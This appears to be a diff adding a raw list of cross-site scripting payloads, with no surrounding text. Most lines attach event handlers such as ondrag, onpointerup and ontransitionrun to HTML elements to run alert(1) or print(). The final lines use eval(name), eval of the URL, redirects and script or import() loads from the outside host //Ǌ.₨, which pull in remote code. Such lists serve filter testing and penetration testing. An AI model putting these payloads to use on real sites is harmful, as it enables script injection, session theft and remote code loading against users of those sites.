@@ -1,0 +1,57 @@
+<body onafterprint=alert(1)><a autofocus onfocus=alert(1) href></a>
+<a autofocus onfocusin=alert(1) href></a>
+<a onpointerup=alert(1) style=display:block>XSS</a>
+<abbr draggable="true" ondrag="alert(1)" style=display:block>test</abbr>
+<abbr draggable="true" ondragend="alert(1)" style=display:block>test</abbr>
+<acronym draggable="true" ondrag="alert(1)" style=display:block>test</acronym>
+<acronym onpointerover=alert(1) style=display:block>XSS</acronym>
+<address onpointerover=alert(1) style=display:block>XSS</address>
+<address onpointerup=alert(1) style=display:block>XSS</address>
+<applet onbeforecopy="alert(1)" contenteditable>test</applet>
+<applet onbeforecut="alert(1)" contenteditable>test</applet>
+<article draggable="true" ondrag="alert(1)" style=display:block>test</article>
+<article draggable="true" ondragend="alert(1)" style=display:block>test</article>
+<aside draggable="true" ondrag="alert(1)" style=display:block>test</aside>
+<aside onmouseenter="alert(1)" style=display:block>test</aside>
+<body onpopstate=print()>
+<body onresize="print()">
+<del onpointerout=alert(1) style=display:block>XSS</del>
+<del onpointerover=alert(1) style=display:block>XSS</del>
+<div draggable="true" contenteditable>drag me</div><font ondragover=alert(1) contenteditable style=display:block>drop here</font>
+<div draggable="true" contenteditable>drag me</div><font ondrop=alert(1) contenteditable style=display:block>drop here</font>
+<div draggable="true" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable style=display:block>drop here</footer>
+<div draggable="true" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable style=display:block>drop here</footer>
+<div draggable="true" contenteditable>drag me</div><form ondragover=alert(1) contenteditable style=display:block>drop here</form>
+<div draggable="true" contenteditable>drag me</div><output ondrop=alert(1) contenteditable style=display:block>drop here</output>
+<embed onpointerup=alert(1) style=display:block>XSS</embed>
+<mark onclick="alert(1)" style=display:block>test</mark>
+<mark oncontextmenu="alert(1)" style=display:block>test</mark>
+<pre onpointermove=alert(1) style=display:block>XSS</pre>
+<pre onpointerout=alert(1) style=display:block>XSS</pre>
+<script onmousedown="alert(1)" style=display:block>test</script>
+<style>:target {transform: rotate(180deg);}</style><li id=x style="transition:transform 2s" ontransitionrun=print()></li>
+<video onkeypress="alert(1)" contenteditable style=display:block>test</video>
+<video onkeyup="alert(1)" contenteditable style=display:block>test</video>
+<video onloadeddata=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video onmousedown="alert(1)" style=display:block>test</video>
+<video onmouseenter="alert(1)" style=display:block>test</video>
+<video onmouseleave="alert(1)" style=display:block>test</video>
+<video onmousemove="alert(1)" style=display:block>test</video>
+<svg/onload=eval(name)>
+<style/onload=eval(name)>
+<svg/onload=eval(`'`+URL)>
+<svg/onload=location=name>
+<style/onerror=eval(name)>
+<script/src=//Ǌ.₨></script>
+<svg/onload=import(/\Ǌ.₨/)>
+<iframe/onload=src=top.name>
+<svg><svg/onload=eval(name)>
+<style/onload=eval(`'`+URL)>
+<iframe/onload=eval(`'`+URL)>
+<style/onload=import(/\Ǌ.₨/)>
+<audio/src/onerror=eval(name)>
+<iframe/onload=import(/\Ǌ.₨/)>
+<img/src/onerror=eval(`'`+URL)>
+<iframe/onload=src=top[0].name+/\Ǌ.₨/>
+<iframe/onload=src=contentWindow.name+/\Ǌ.₨/>
+<iframe/srcdoc="<script/src=//Ǌ.₨></script>">
